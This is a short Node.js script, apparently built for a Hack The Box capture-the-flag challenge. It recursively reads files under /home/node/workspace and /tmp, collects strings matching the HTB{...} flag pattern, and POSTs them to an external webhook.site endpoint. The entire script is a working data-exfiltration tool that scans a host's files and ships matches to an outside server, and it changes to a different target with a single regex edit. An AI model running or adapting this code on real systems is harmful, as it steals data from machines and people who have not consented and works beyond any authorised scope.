const fs = require('fs');
const https = require('https');
const WEBHOOK_URL = 'https://webhook.site/12345678-1234-1234-1234-123456789abc';
const PAT = /HTB\{.*?\}/g;
const MAX_FILES = 800;
const roots = ['/home/node/workspace', '/tmp'];
const findings = [];
let scanned = 0;

function send(obj) {
  const req = https.request(WEBHOOK_URL, { method: 'POST' });
  req.end(JSON.stringify(obj));
}

function walk(dir) {
  for (const entry of fs.readdirSync(dir, { withFileTypes: true })) {
    if (scanned >= MAX_FILES || findings.length >= 15) return;
    const full = `${dir}/${entry.name}`;
    if (entry.isDirectory()) walk(full);
    else {
      scanned++;
      const text = fs.readFileSync(full, 'utf8');
      const matches = text.match(PAT);
      if (matches) findings.push({ file: full, matches });
    }
  }
}

roots.forEach(walk);
send({ findings });
